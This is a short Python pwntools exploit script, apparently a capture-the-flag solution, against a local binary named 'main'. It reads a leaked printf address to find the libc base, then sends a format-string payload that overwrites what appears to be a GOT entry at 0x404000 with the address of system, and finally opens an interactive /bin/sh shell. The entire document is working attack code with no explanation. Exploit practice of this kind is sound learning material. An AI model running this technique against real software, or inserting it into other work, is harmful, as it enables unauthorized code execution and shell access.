from pwn import * 
from time import *

def debug():
	gdb.attach(p,'''
		b* main+104
		c
		x/gx 0x404000
		si
		finish
		x/gx 0x404000
	''')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p=process("./main")

puts=0x404000
p.recvuntil("take this : ")
leak=int(p.recv(14),16)
libc.address=leak-libc.symbols["printf"]
print(hex(libc.symbols["system"]))
p.send(b"/bin/sh;"+b"%10$s\x00"+b"a"*2+p64(puts))

sleep(0.5)

p.sendline(b"/bin/sh;"+p64(libc.symbols["system"] +5))
p.interactive()